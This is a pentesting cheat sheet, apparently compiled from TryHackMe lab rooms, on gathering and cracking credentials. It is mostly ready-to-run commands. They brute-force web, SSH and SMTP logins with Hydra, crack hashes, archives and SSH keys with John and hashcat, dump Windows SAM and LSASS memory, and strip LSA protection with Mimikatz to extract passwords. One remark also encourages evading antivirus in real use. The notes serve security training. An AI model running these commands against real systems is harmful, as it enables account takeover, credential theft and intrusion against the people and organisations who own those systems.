# Credential Gathering & Cracking

Stopped at Windows Credential Manager on [credential-harvesting.md](credential-harvesting.md "mention")

## Analyzing Hashes

### Websites

**Hash Analyzer:** [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)

### Hash ID

Great tool that the room provides, use it to identify the hash type when John can't identify the hash by itself.

```
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py $HASH
```



## Create Password Lists

#### Examples

[password-attacks.md](password-attacks.md "mention")

In some cases the default password lists aren't enough. We may get some sort of clue that shows we should use a modified list. Below are some general steps to follow to create it. First make a format that it should follow some sort of standard. Below we are going to make our list with the below criteria as an example does the following:

1. Start with an uppercase letter followed by a lowercase letter.
2. Have two consecutive digits somewhere in the password.
3. Start with one of the specified special characters (!, @, #, $).

### **Explanation**

* `Az`: This part of the rule specifies that the rule is applied only to passwords containing at least one uppercase letter (`A-Z`) followed by a lowercase letter (`a-z`).
* `"[0-9][0-9]"`: This part of the rule indicates that the password should contain two consecutive digits (numbers from 00 to 99).
* `^[!@#$]`: This part of the rule uses the caret (^) at the beginning to enforce that the following characters should be at the start of the password. It specifies that the password should start with one of the characters listed within the square brackets: `!`, `@`, `#`, or `$`. The `!` is a negation operator, meaning it should not start with any character other than the ones listed.

#### **john.conf**

```
[List.Rules:THM-Password-Attacks]
Az"[0-9][0-9]" ^[!@#$]
```

This will create your list which you then can use with hydra, john or any other brute forcing tools

**Kali**

```
john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
```

## Web

### Crack a simple web login

#### Examples

[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
```



### **Crafting request for Hydra**

This example shows how to brute force a POST request. Check HackPark how to get the request from Burp.

#### Examples

[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=vvTqZ%2FG4tEKhQoxeTpJ%2FyGxM9ZY9ZIvd6YMUS%2BoY3uaQCjC%2BJRdlkd8rbIQsDHztL%2BjsAvOLJhxU7vTNo3GP%2FLEmsndGPNAlCDn%2FB%2FrK2ynp9QkhRe9iqKBUmM5FQT2kX%2Bg%2BfPDNnTuzqW5IlmTujw4sLEzbvvec9FDW4cbQevgTj1tHnKx0vMmkVah5imro0o%2BHvQ5%2FGvpafEs1NdnW6wrSsUFuXnYzletKCdLG%2FgSb7bCDOK4ukZK%2F1cMOgYtjOCU4gk4M7PhQcYZmGpAN7pPVCMpX2YwGnTSgBPPmCB6avoLqG5jRS%2F3PYMjsqEGcD9P9S555GMQPxtfyvOEaJw%2B%2BZELKU2yVYr4uWxamEITsWNAT&__EVENTVALIDATION=Tp%2B5DS80H3PFB8ipJ24uKyHkPhSkqKD7GFJlc2U6IaO61l68aholdIjrZJ%2FsotSi0QxRBQjayWovmb2SU%2Fk6lY%2BOpju62jOGDkAvqcdNsqGrgf3vrAYw88XT2ONABFvDTR771I2YAr7JylJ0HbBZV83nGvvXWSC6rmKDGn80%2FuszTjDZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
```



This example shows how to brute force a GET request. Check Password Attacks how to get the request from Burp.

#### Examples

[password-attacks.md](password-attacks.md "mention")

**Kali**

```
hydra -l $USERNAME -P dict.lst $VICTIM http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php"
```





## **SSH**

### Brute force SSH

#### Examples

[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM -t 4 ssh
```

### Cracking SSH Keys

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
/opt/john/ssh2john.py idrsa.id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

## SMTP

Crack password for a specfic username

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt smtp://$VICTIM:25 -v
```

## Files

### Protected Zip Files

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
zip2john secure.zip > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt 
```

### Protected RAR Archives

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
/opt/john/rar2john secure.rar > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
```

### Shadow

#### Examples

[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")

If /etc/shadow is readable you might be able to crack the hashes.

**Victim**

```
cat /etc/shadow
```

**Kali**

```
unshadow passwd shadow > passwords.txt
```

**Kali**

```
python hash-id.py $HASH
```

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```



### Volume Shadow Copy Service

**Examples**

[credential-harvesting.md](credential-harvesting.md "mention")

The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes. You can visit the [Microsoft documentation page](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) for more information about the service.

More specifically, we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:

**Victim(cmd)**

```
wmic shadowcopy call create Volume='C:\'
```

Once the command is successfully executed, let's use the `vssadmin`, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the `C:` volume.&#x20;

**Victim(cmd)**

```
vssadmin list shadows
```

The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system.

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,

**Victim(cmd)**

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\$VICTIM\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\$VICTIM\Desktop\system
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work).

### Registry Hives

**Examples**

[credential-harvesting.md](credential-harvesting.md "mention")

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.

**Victim(cmd)**

```
reg save HKLM\sam C:\users\$USER\Desktop\sam-reg
reg save HKLM\system C:\users\$USER\Desktop\system-reg
```

Let's this time decrypt it using one of the Impacket tools: `secretsdump.py.`The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.

Move both SAM and system files back to Kali

**Kali**&#x20;

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
```

### Local Security Authority Subsystem Service (LSASS)

**Example**

[credential-harvesting.md](credential-harvesting.md "mention")

#### Graphic User Interface (GUI)

To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".

![](<../../.gitbook/assets/image (7) (1) (4) (2).png>)

![](<../../.gitbook/assets/image (6) (1) (5).png>)

Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline.

Note: if we try this on the provided VM, you should get an error the first time this is run, until we fix the registry value in the Protected LSASS section later in this task.

Copy the dumped process to the Mimikatz folder

**Victim(cmd)**

```
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

#### Sysinternals Suite(No GUI)

**Example**

[credential-harvesting.md](credential-harvesting.md "mention")

An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt.&#x20;

We can specify a running process, which in our case is lsass.exe, to be dumped as follows.

**Victim(cmd)**

```
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.

### MimiKatz

**Example**

[credential-harvesting.md](credential-harvesting.md "mention")

Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,

**Victim(cmd)**

```
C:\Tools\Mimikatz\mimikatz.exe
```

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing `privilege::debug` command as follows,

**Victim(mimikatz)**

```
privilege::debug
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the `lsass.exe` process using `sekurlsa::logonpasswords`. If we try this on the provided VM, it will not work until we fix it in the next section.

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash.&#x20;

Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.

### Protected LSASS

**Example**

[credential-harvesting.md](credential-harvesting.md "mention")

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.

<figure><img src="../../.gitbook/assets/image (3) (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

<figure><img src="../../.gitbook/assets/image (9) (1) (4).png" alt=""><figcaption></figcaption></figure>

The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

**Victim(mimikatz)**

```
!+
```

<figure><img src="../../.gitbook/assets/image (4) (11) (1).png" alt=""><figcaption></figcaption></figure>

Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again.\


**Victim(cmd)**

```
cd C:\Tools\Mimikatz
mimikatz.exe
```

**Victim(mimikatz)**

```
!+
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

\
Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

**Victim(mimikatz)**

```
!processprotect /process:lsass.exe /remove
```



<figure><img src="../../.gitbook/assets/image (11) (13).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
copy C:\Users\thm\AppData\Local\Temp\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

**Victim(cmd)**

```
c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

<figure><img src="../../.gitbook/assets/image (18) (8).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

<pre><code><strong>mimikatz.exe
</strong></code></pre>

**Victim(mimikatz)**

<pre><code><strong>privilege::debug
</strong></code></pre>

**Victim(mimikatz)**

```
sekurlsa::logonpasswords
```

<figure><img src="../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>

## Windows Cred

## Hashes

### Crack MD5 hash

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=raw-md5 hash.txt 
```

### Crack SHA-1 hash

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=raw-sha1 hash.txt
```

### Crack SHA-256

#### Examples

[game-zone.md](../../walkthroughs/tryhackme/game-zone.md "mention") [john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```

### Crack SHA-512

#### Examples

[overpass-2-hacked.md](../../walkthroughs/tryhackme/overpass-2-hacked.md "mention")[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[linux-privesc.md](../../walkthroughs/tryhackme/linux-privesc.md "mention")



**Kali**

```
john --format=raw-sha512 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

**Kali**

```
hashcat -m 1710 -w /usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1710 hash.txt --show
```

### Crack BCrypt

#### Examples

[daily-bugle.md](../../walkthroughs/tryhackme/daily-bugle.md "mention")

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```



### Crack Whirlpool

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=whirlpool hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```



### Crack NT hash

#### Examples

[blue.md](../../walkthroughs/tryhackme/blue.md "mention")

**Kali**

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Crack NTLM

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

**Kali**

```
john --format=nt ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

### Crack NetNTLMv2

#### Examples

[breaching-active-directory.md](../../walkthroughs/tryhackme/breaching-active-directory.md "mention")

**Kali**

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

### Crack Kerberos 5, etype 23, TGS-REP

#### Examples

[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")



**Kali**

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```

### Crack Kerberos 5, etype 23, AS-REP

#### Examples

[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")

**Kali**

```
hashcat -m 18200 hash.txt Pass.txt
hashcat -m 18200 hash.txt Pass.txt --show
```



